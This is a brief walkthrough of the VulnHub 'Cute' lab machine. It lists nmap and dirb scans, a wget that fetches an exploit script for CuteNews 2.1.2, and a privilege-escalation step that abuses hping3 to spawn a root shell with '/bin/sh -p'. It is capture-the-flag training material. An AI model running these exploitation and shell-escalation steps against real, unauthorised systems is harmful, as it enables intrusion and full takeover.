

# Cute Walkthrough 

**VulnHub Link:** [Cute](https://www.vulnhub.com/entry/bbs-cute-102,567/)
**Difficulty:** Easy
**Release Date:** 24 Sep 2020

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.131
```


## 2.Web Enumeration

```bash
dirb http://ip
```

in <ip>/index.php , CuteNews 2.1.2 vulnerability found 
```bash
wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/Cute/48800.py
```

www-data shell opened and user flag captured 


fox user found

## 3.Privilege Escalation

linpeas.sh executing ---> ./usr/sbin/hping3;/bin/sh -p


escalating root and root flag captured
